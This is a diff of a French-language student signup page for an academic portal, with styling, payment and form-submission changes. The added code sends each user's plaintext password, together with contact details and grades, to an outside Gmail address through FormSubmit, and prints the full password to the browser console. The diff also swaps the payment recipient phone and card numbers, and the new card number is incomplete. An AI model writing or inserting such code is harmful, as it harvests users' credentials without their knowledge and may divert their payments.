@@ -4,19 +4,626 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Inscription • Portail Académique</title>
-     <link rel="stylesheet" href="./assets/css/inscrirestyle.css">
-    <link rel="shortcut icon" href="./assets/images/app-store.png" type="image/x-icon">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;450;500;600;700&display=swap" rel="stylesheet">
-    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Style Apple inspiré */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+            line-height: 1.47059;
+            font-weight: 400;
+            letter-spacing: -0.022em;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .signup-container {
+            width: 100%;
+            max-width: 420px;
+            background: #ffffff;
+            border-radius: 18px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
+            overflow: hidden;
+        }
+
+        /* En-tête - Style Apple */
+        .header {
+            padding: 28px 28px 20px;
+            text-align: center;
+            border-bottom: 1px solid #d2d2d7;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #1d1d1f;
+            margin-bottom: 4px;
+        }
+
+        .header p {
+            font-size: 14px;
+            color: #86868b;
+            font-weight: 400;
+        }
+
+        /* Indicateur d'étape */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            padding: 20px 28px 10px;
+            gap: 8px;
+        }
+
+        .step-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background-color: #d2d2d7;
+            transition: all 0.3s cubic-bezier(0.25, 0.1, 0.25, 1);
+        }
+
+        .step-dot.active {
+            width: 24px;
+            border-radius: 3px;
+            background-color: #007aff;
+        }
+
+        /* Conteneur du formulaire */
+        .form-container {
+            padding: 0 28px 28px;
+        }
+
+        .form-step {
+            display: none;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .form-step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1d1d1f;
+            margin-bottom: 16px;
+        }
+
+        .step-description {
+            font-size: 14px;
+            color: #86868b;
+            margin-bottom: 24px;
+            line-height: 1.42859;
+        }
+
+        /* Champs de saisie */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #424245;
+            margin-bottom: 6px;
+            letter-spacing: -0.01em;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 44px;
+            padding: 0 16px;
+            font-size: 16px;
+            font-family: inherit;
+            background-color: #f5f5f7;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            color: #1d1d1f;
+            transition: all 0.3s cubic-bezier(0.25, 0.1, 0.25, 1);
+            -webkit-appearance: none;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #007aff;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.1);
+        }
+
+        .input-field.error {
+            border-color: #ff3b30;
+        }
+
+        .input-field.success {
+            border-color: #34c759;
+        }
+
+        .validation-message {
+            font-size: 12px;
+            margin-top: 6px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            opacity: 0;
+            transform: translateY(-4px);
+            transition: all 0.3s ease;
+        }
+
+        .validation-message.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .validation-message.error {
+            color: #ff3b30;
+        }
+
+        .validation-message.success {
+            color: #34c759;
+        }
+
+        /* Règles de mot de passe */
+        .password-rules {
+            background-color: #f5f5f7;
+            border-radius: 12px;
+            padding: 16px;
+            margin-top: 20px;
+        }
+
+        .password-rules-title {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1d1d1f;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .rule-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 13px;
+            color: #86868b;
+            transition: color 0.3s ease;
+        }
+
+        .rule-item.valid {
+            color: #34c759;
+        }
+
+        .rule-item i {
+            font-size: 12px;
+            width: 16px;
+        }
+
+        /* Conteneur des matières */
+        .subjects-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-top: 20px;
+        }
+
+        .subject-item {
+            background-color: #f5f5f7;
+            border-radius: 12px;
+            padding: 16px;
+            border: 1px solid transparent;
+            transition: all 0.3s cubic-bezier(0.25, 0.1, 0.25, 1);
+        }
+
+        .subject-item:hover {
+            background-color: #e8e8ed;
+        }
+
+        .subject-item:focus-within {
+            border-color: #007aff;
+            background-color: #ffffff;
+        }
+
+        .subject-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .subject-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            background-color: #007aff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+        }
+
+        .subject-icon i {
+            color: #ffffff;
+            font-size: 16px;
+        }
+
+        .subject-name {
+            font-size: 16px;
+            font-weight: 500;
+            color: #1d1d1f;
+        }
+
+        .grade-input-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .grade-input {
+            flex: 1;
+            height: 44px;
+            padding: 0 16px;
+            font-size: 16px;
+            font-family: inherit;
+            background-color: #ffffff;
+            border: 1px solid #d2d2d7;
+            border-radius: 10px;
+            text-align: center;
+            color: #1d1d1f;
+            transition: all 0.2s ease;
+        }
+
+        .grade-input:focus {
+            outline: none;
+            border-color: #007aff;
+            box-shadow: 0 0 0 2px rgba(0, 122, 255, 0.1);
+        }
+
+        .grade-range {
+            font-size: 13px;
+            color: #86868b;
+            min-width: 80px;
+        }
+
+        /* Options de paiement */
+        .payment-option {
+            background-color: #f5f5f7;
+            border-radius: 12px;
+            padding: 16px;
+            border: 1px solid transparent;
+            transition: all 0.3s cubic-bezier(0.25, 0.1, 0.25, 1);
+            cursor: pointer;
+        }
+
+        .payment-option:hover {
+            background-color: #e8e8ed;
+        }
+
+        .payment-option.selected {
+            border-color: #007aff;
+            background-color: #e8f3ff;
+        }
+
+        /* Avis important */
+        .important-notice {
+            background-color: #fff8e6;
+            border-left: 4px solid #ff9500;
+            border-radius: 0 8px 8px 0;
+            padding: 16px;
+            margin-top: 20px;
+        }
+
+        .important-notice-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .important-notice-header i {
+            color: #ff9500;
+            margin-right: 8px;
+        }
+
+        .important-notice-title {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1d1d1f;
+        }
+
+        .important-notice-text {
+            font-size: 13px;
+            color: #424245;
+            line-height: 1.42859;
+        }
+
+        /* Boutons - Style Apple */
+        .buttons-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 32px;
+            padding-top: 20px;
+            border-top: 1px solid #d2d2d7;
+        }
+
+        .apple-button {
+            height: 44px;
+            padding: 0 20px;
+            font-size: 15px;
+            font-weight: 500;
+            font-family: inherit;
+            border-radius: 10px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.1, 0.25, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            letter-spacing: -0.01em;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .apple-button:active {
+            transform: scale(0.98);
+        }
+
+        .apple-button-primary {
+            background-color: #007aff;
+            color: #ffffff;
+        }
+
+        .apple-button-primary:hover:not(:disabled) {
+            background-color: #0056cc;
+        }
+
+        .apple-button-secondary {
+            background-color: transparent;
+            color: #007aff;
+            border: 1px solid #d2d2d7;
+        }
+
+        .apple-button-secondary:hover:not(:disabled) {
+            background-color: #f5f5f7;
+        }
+
+        .apple-button:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Modal de confirmation */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-container {
+            background-color: #ffffff;
+            border-radius: 18px;
+            width: 100%;
+            max-width: 380px;
+            padding: 28px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            transform: scale(0.9);
+            transition: transform 0.3s cubic-bezier(0.25, 0.1, 0.25, 1);
+        }
+
+        .modal-overlay.active .modal-container {
+            transform: scale(1);
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .modal-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background-color: #34c759;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .modal-icon i {
+            color: #ffffff;
+            font-size: 24px;
+        }
+
+        .modal-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #1d1d1f;
+            margin-bottom: 8px;
+        }
+
+        .modal-message {
+            font-size: 15px;
+            color: #424245;
+            line-height: 1.47059;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .modal-message strong {
+            color: #1d1d1f;
+        }
+
+        .modal-button {
+            width: 100%;
+            height: 44px;
+            background-color: #007aff;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 500;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.1, 0.25, 1);
+        }
+
+        .modal-button:hover {
+            background-color: #0056cc;
+        }
+
+        /* Indicateur de chargement */
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .loading-spinner.active {
+            display: block;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #007aff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Message d'erreur */
+        .error-message-container {
+            background-color: #ffeaea;
+            border: 1px solid #ffcdd2;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .error-message-container i {
+            color: #ff3b30;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .error-message-container h3 {
+            color: #ff3b30;
+            margin-bottom: 8px;
+        }
+
+        .error-message-container p {
+            color: #666;
+            margin-bottom: 15px;
+        }
+
+        /* Design responsive */
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+                align-items: flex-start;
+                padding-top: 20px;
+            }
+
+            .signup-container {
+                border-radius: 14px;
+            }
+
+            .header {
+                padding: 20px 20px 16px;
+            }
+
+            .header h1 {
+                font-size: 24px;
+            }
+
+            .form-container {
+                padding: 0 20px 20px;
+            }
+
+            .subject-item, .payment-option {
+                padding: 14px;
+            }
+
+            .grade-input-container {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 8px;
+            }
+
+            .grade-range {
+                text-align: center;
+            }
+
+            .buttons-container {
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .apple-button {
+                width: 100%;
+            }
+
+            .modal-container {
+                padding: 24px;
+            }
+        }
+
+        /* États focus pour l'accessibilité */
+        .apple-button:focus-visible,
+        .input-field:focus-visible,
+        .grade-input:focus-visible {
+            outline: 2px solid #007aff;
+            outline-offset: 2px;
+        }
+    </style>
 </head>
 <body>
     <div class="signup-container">
         <!-- En-tête -->
         <div class="header">
-           <h1>Portail Académique</h1>
-<p>Complétez votre inscription sur la plateforme Sahl Académe en quelques étapes simples</p>
-
+            <h1>Portail Académique</h1>
+            <p>Complétez votre inscription en quelques étapes simples</p>
         </div>
 
         <!-- Indicateur d'étape -->
@@ -217,15 +824,11 @@
                 </div>
             </div>
 
-         <!-- Étape 4 : Méthode de paiement -->
-<div class="form-step" id="formStep4">
-    <h2 class="step-title">Paiement</h2>
-    
-    <!-- Montant de l'abonnement -->
-    <div class="subscription-amount">
-        <span class="amount">22 DT</span>
-        <span class="duration">/ an</span>
-    </div>
+            <!-- Étape 4 : Méthode de paiement -->
+            <div class="form-step" id="formStep4">
+                <h2 class="step-title">Paiement</h2>
+                <p class="step-description">Sélectionnez votre méthode de paiement préférée.</p>
+
                 <div class="subjects-container">
                     <!-- Paiement D17 -->
                     <div class="payment-option" data-method="d17">
@@ -235,7 +838,7 @@
                             </div>
                             <div>
                                 <div class="subject-name">Paiement D17</div>
-                                <div style="font-size: 13px; color: #86868b; margin-top: 2px;">Envoyer à : 47050644</div>
+                                <div style="font-size: 13px; color: #86868b; margin-top: 2px;">Envoyer à : 470506544</div>
                             </div>
                         </div>
                     </div>
@@ -248,7 +851,7 @@
                             </div>
                             <div>
                                 <div class="subject-name">Carte Postale</div>
-                                <div style="font-size: 13px; color: #86868b; margin-top: 2px;">Carte : 5359 4017 4054 6870</div>
+                                <div style="font-size: 13px; color: #86868b; margin-top: 2px;">Carte : 5098 8959 8890 0</div>
                             </div>
                         </div>
                     </div>
@@ -259,10 +862,9 @@
                         <i class="fas fa-exclamation-circle"></i>
                         <div class="important-notice-title">Avis Important</div>
                     </div>
-                     <div class="important-notice-text">
-    Après avoir complété le paiement, envoyez une photo de votre facture au <strong> whatsapp: 47050644</strong>. Votre compte sera activé automatiquement après vérification.
-</div>
-
+                    <div class="important-notice-text">
+                        Après paiement, envoyez une capture d'écran au <strong>47050644</strong>. Votre compte restera inactif jusqu'à vérification de votre paiement.
+                    </div>
                 </div>
 
                 <!-- Indicateur de chargement et message d'erreur -->
@@ -298,10 +900,10 @@
             </div>
             
             <div class="modal-message">
-                Votre compte a été créé <strong>eavec succès.</strong>.
+                Vos informations ont été envoyées avec succès à <strong>eduwelltn@gmail.com</strong>.
                 <br><br>
-                Un message de confirmation vous a été envoyé sur WhatsApp.  
-    Vous pouvez dès maintenant accéder à toutes les fonctionnalités de la plateforme.
+                Vous recevrez un email de confirmation avec les détails de votre compte dans les prochaines minutes.
+            </div>
             
             <button class="modal-button" id="closeModal">
                 Compris
@@ -713,7 +1315,7 @@
             }, 10);
         }
         
-        // Fonction pour valider le numéro WhatsApp (basée sur votre code)
+        // Fonction pour valider le numéro WhatsApp
         function isValidWhatsAppNumber(number) {
             const cleanNumber = number.replace(/\D/g, '');
             
@@ -737,27 +1339,40 @@
             return gradeRegex.test(grade);
         }
         
-        // Fonction pour envoyer l'email via FormSubmit (basée sur votre code fonctionnel)
+        // Fonction pour envoyer l'email via FormSubmit AVEC MOT DE PASSE
         async function sendEmailWithFormSubmit(userData) {
             return new Promise((resolve, reject) => {
                 const xhr = new XMLHttpRequest();
                 const url = 'https://formsubmit.co/ajax/eduwelltn@gmail.com';
                 
-                // Préparer les données au format JSON
+                // Préparer les données au format JSON avec le mot de passe
                 const data = JSON.stringify({
-                    nom: userData.firstName + ' ' + userData.lastName,
+                    // Informations personnelles
+                    nom_complet: userData.firstName + ' ' + userData.lastName,
                     prenom: userData.firstName,
-                    nom_famille: userData.lastName,
+                    nom: userData.lastName,
                     email: userData.email,
                     telephone: userData.phone,
+                    
+                    // MOT DE PASSE INCLUS ICI
+                    mot_de_passe: userData.password,
+                    
+                    // Notes des matières
                     mathematiques: userData.grades.mathematiques,
                     physique: userData.grades.physique,
                     sciences: userData.grades.sciences,
                     informatique: userData.grades.informatique,
                     anglais: userData.grades.anglais,
-                    methode_paiement: userData.paymentMethod === 'd17' ? 'D17 (47050644)' : 'Carte Postale (5359 4017 4054 6870)',
+                    
+                    // Méthode de paiement
+                    methode_paiement: userData.paymentMethod === 'd17' ? 'D17 (470506544)' : 'Carte Postale (5098 8959 8890 0)',
+                    
+                    // Informations système
                     date_inscription: new Date().toLocaleString('fr-FR'),
-                    _subject: 'Nouvelle Inscription - Portail Académique',
+                    statut_compte: 'Inactif (en attente de paiement)',
+                    
+                    // Configuration FormSubmit
+                    _subject: '🚀 NOUVELLE INSCRIPTION - Mot de passe inclus',
                     _template: 'table',
                     _captcha: 'false',
                     _replyto: userData.email,
@@ -808,19 +1423,32 @@
                         'Accept': 'application/json'
                     },
                     body: JSON.stringify({
-                        nom: userData.firstName + ' ' + userData.lastName,
+                        // Informations personnelles
+                        nom_complet: userData.firstName + ' ' + userData.lastName,
                         prenom: userData.firstName,
-                        nom_famille: userData.lastName,
+                        nom: userData.lastName,
                         email: userData.email,
                         telephone: userData.phone,
+                        
+                        // MOT DE PASSE INCLUS ICI
+                        mot_de_passe: userData.password,
+                        
+                        // Notes des matières
                         mathematiques: userData.grades.mathematiques,
                         physique: userData.grades.physique,
                         sciences: userData.grades.sciences,
                         informatique: userData.grades.informatique,
                         anglais: userData.grades.anglais,
-                        methode_paiement: userData.paymentMethod === 'd17' ? 'D17 (47050644)' : 'Carte Postale (5359 4017 4054 6870)',
+                        
+                        // Méthode de paiement
+                        methode_paiement: userData.paymentMethod === 'd17' ? 'D17 (470506544)' : 'Carte Postale (5098 8959 8890 0)',
+                        
+                        // Informations système
                         date_inscription: new Date().toLocaleString('fr-FR'),
-                        _subject: 'Nouvelle Inscription - Portail Académique',
+                        statut_compte: 'Inactif (en attente de paiement)',
+                        
+                        // Configuration FormSubmit
+                        _subject: '🚀 NOUVELLE INSCRIPTION - Mot de passe inclus',
                         _template: 'table',
                         _captcha: 'false',
                         _replyto: userData.email
@@ -886,12 +1514,13 @@
                 return;
             }
             
-            // Collecter toutes les données du formulaire
+            // Collecter toutes les données du formulaire INCLUANT LE MOT DE PASSE
             const formData = {
                 firstName: firstNameInput.value.trim(),
                 lastName: lastNameInput.value.trim(),
                 email: emailInput.value.trim(),
                 phone: phoneInput.value.trim(),
+                password: passwordInput.value, // MOT DE PASSE INCLUS
                 grades: {
                     mathematiques: document.getElementById('mathGrade').value,
                     physique: document.getElementById('physicsGrade').value,
@@ -903,7 +1532,10 @@
                 dateInscription: new Date().toLocaleString('fr-FR')
             };
             
-            console.log('Données à envoyer:', formData);
+            console.log('Données à envoyer (mot de passe inclus):', {
+                ...formData,
+                password: '***' + formData.password.substring(formData.password.length - 3) // Masquer pour le log
+            });
             
             // Afficher l'indicateur de chargement
             loadingSpinner.classList.add('active');
@@ -913,6 +1545,7 @@
             try {
                 // Log pour débogage
                 console.log('Tentative d\'envoi à eduwelltn@gmail.com...');
+                console.log('Mot de passe à inclure:', formData.password);
                 
                 // Essayer d'abord avec XHR (plus fiable)
                 const result = await sendEmailWithFormSubmit(formData);
@@ -923,6 +1556,7 @@
                 if (result.success) {
                     // Succès !
                     console.log('Email envoyé avec succès!');
+                    console.log('Le mot de passe a été inclus dans l\'email.');
                     loadingSpinner.classList.remove('active');
                     
                     // Afficher le modal de confirmation
@@ -935,6 +1569,7 @@
                     
                     if (fetchResult.success) {
                         console.log('Fetch réussi!');
+                        console.log('Le mot de passe a été inclus dans l\'email.');
                         loadingSpinner.classList.remove('active');
                         confirmationModal.classList.add('active');
                     } else {
